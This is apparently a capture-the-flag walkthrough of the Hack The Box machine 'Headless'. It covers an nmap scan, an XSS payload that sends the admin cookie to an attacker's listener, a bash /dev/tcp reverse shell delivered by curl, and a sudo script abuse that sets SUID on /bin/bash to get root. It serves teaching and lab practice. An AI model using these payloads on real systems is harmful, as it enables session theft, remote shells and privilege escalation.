## Phase 1: Reconnaissance ### Nmap Scan Reconnaissance is the initial step where we gather information about the target system. ```shell nmap -sCV 10.10.11.8

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-26 02:27 EDT
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Tue, 26 Mar 2024 06:25:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Explanation:

- Port 22 is open, indicating an SSH service running OpenSSH 9.2p1.
- Port 5000 is open, running a web service using Werkzeug/2.2.2 on Python/3.11.2.
- The is_admin cookie clue hints at potential privilege escalation paths.

## Phase 2: XSS Attack

### Why Consider XSS?

XSS vulnerabilities are common in web applications and occur when untrusted user input is processed and reflected back without proper sanitization. Here, the application mentions that the report is sent to administrators for investigation, suggesting that injected scripts may execute on the admin's browser.

### Key Indicators:

- Admin Cookie: Presence of is_admin cookie indicates privilege differentiation.
- Report Sent to Admin: Implies the potential for stored XSS.

### Exploiting XSS

**Payload:**
<img src=x onerror=fetch('http://your_ip:your_port/'+document.cookie);>


**Steps:**

1. **Inject Payload:** Inject the payload into the input form.
2. **Capture Cookie:** Set up a listener on your attacking machine to capture the admin's cookie
nc -lvnp your_port
3. **Replace Cookie:** Use the captured cookie to gain admin access.

### OWASP Zap for XSS Detection

OWASP Zap can automate the detection of XSS vulnerabilities.

**Automated Scan:**

- Identifies reflections of input fields.
- Highlights the lack of HTTPOnly flag on cookies, making them susceptible to theft via JavaScript.

**Fuzzing User-Agent:**

- Injects common XSS payloads to identify reflections and potential vulnerabilities.

### Why This XSS Works:

HTB simulates an admin reviewing reports by using a script that processes the reports. This is handled by app.py, which writes the reports to disk.

**Payload:**

shell

Copy code

`/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.34/4444 0>&1'`

**Curl Request:**

shell

Copy code

`curl --path-as-is -i -s -k -X POST \\     -H 'Host: 10.10.11.8:5000' -H 'Content-Length: 118' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: http://10.10.11.8:5000' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H 'Referer: http...`

### Explanation:

The payload injects a command that opens a reverse shell to your attacking machine. The curl command sends this payload to the server.

## Phase 4: Privilege Escalation

### Enumeration:

Check sudo privileges:

shell

Copy code

`sudo -l`

**Output:**

ruby

Copy code

`Matching Defaults entries for dvir on headless:     env_reset, mail_badpass,     secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,     use_pty  User dvir may run the following commands on headless:     (ALL) NOPASSWD: /usr/bin/syscheck`

### Explanation:

The user dvir can run /usr/bin/syscheck with root privileges without a password.

### Reviewing the Script:

Contents of /usr/bin/syscheck:

shell

Copy code

`strings /usr/bin/syscheck`

**Key Part of the Script:**

shell

Copy code

`#!/bin/bash if [ "$EUID" -ne 0 ]; then   exit 1 fi last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1) formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M") /usr/bin/echo "Last Kernel Modification Time: $formatted_time" disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}') /usr/bin/echo "Available disk space: $disk_space" load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}') /usr/bin/echo "System load average: $load_average" if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then   /usr/bin/echo "Database service is not running. Starting it..."   ./initdb.sh 2>/dev/null else   /usr/bin/echo "Database service is running." fi exit 0`

### Explanation:

The script runs with root privileges and executes ./initdb.sh if it is not running.

### Exploiting the Script:

Create a malicious initdb.sh script to escalate privileges.

**Payload:**

shell

Copy code

`echo "chmod u+s /bin/bash" > /home/dvir/initdb.sh chmod +x /home/dvir/initdb.sh sudo /usr/bin/syscheck`

### Explanation:

The payload sets the SUID bit on /bin/bash, which allows any user to run bash with root privileges.

### Get a Root Shell:

/bin/bash -p

### Explanation:

Running bash -p after setting the SUID bit gives a root shell.

### Understanding bash -p:

The bash -p command runs the Bash shell in "privileged mode." This mode is particularly useful when the SUID bit is set on the Bash executable.

### SUID Bit:

SUID (Set User ID): This is a special type of file permission that allows a user to run an executable with the permissions of the executable's owner. When applied to the Bash shell, it allows any user running the shell to have the permissions of the file owner, which is typically root.

### Privileged Mode:

When you set the SUID bit on /bin/bash, running bash -p ensures that the shell retains its elevated privileges (root) even if it is executed by a non-privileged user.

### Why Use bash -p After SUID:

- Elevated Privileges: To exploit the elevated privileges granted by the SUID bit.
- Root Shell: Ensures the shell operates with root privileges, allowing you to execute commands as root without needing to prefix them with sudo.

